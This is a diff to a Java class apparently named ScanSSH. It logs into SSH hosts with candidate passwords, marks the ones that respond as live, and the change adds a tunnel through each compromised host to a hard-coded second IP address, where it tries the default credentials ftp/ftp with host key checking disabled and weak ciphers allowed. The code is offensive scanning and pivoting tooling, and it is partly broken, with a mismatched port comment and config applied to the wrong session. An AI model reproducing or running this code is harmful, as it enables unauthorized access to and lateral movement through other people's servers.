@@ -384,21 +384,41 @@ public class ScanSSH {
     }
 
     public void Check_ssh(Session session, int id, String pass) throws JSchException {
-
+        Session secondSession = null;
         try {
             //check connect ip
             session.setPassword(pass);
             session.connect();
 
             //check fresh ip
-            Channel channel = session.openChannel("direct-tcpip");
-            ((ChannelDirectTCPIP) channel).setHost(HostCheckFresh);
-            ((ChannelDirectTCPIP) channel).setPort(PortCheckFresh);
+            String tunnelRemoteHost = "220.255.197.1"; // The host of the second target
+            String secondPassword = "ftp";
+            String secondUser = "ftp";
+            session.setPortForwardingL(1080, tunnelRemoteHost, 22);
+            session.openChannel("direct-tcpip");
 
-            channel.connect(10000);
+            // create a session connected to port 2233 on the local host.
+            try {
+                secondSession = sshClient.getSession(secondUser, "localhost", 1080);
+                secondSession.setPassword(secondPassword);
+
+                session.setConfig("StrictHostKeyChecking", "no");
+                session.setConfig("GSSAPIAuthentication", "no");
+                session.setConfig("kex", "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256");
+                session.setConfig("server_host_key", "ssh-dss,ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521");
+                session.setConfig("cipher.c2s",
+                        "blowfish-cbc,3des-cbc,aes128-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr,3des-ctr,arcfour,arcfour128,arcfour256");
+
+                secondSession.connect();
+            } catch (Exception e) {
+
+            } finally {
+                secondSession.disconnect();
+            }
 
             Bit_CheckIps[id] = true;
             NumberOfIpsLive++;
+
         } catch (Exception ex) {
             ex.getMessage();
 
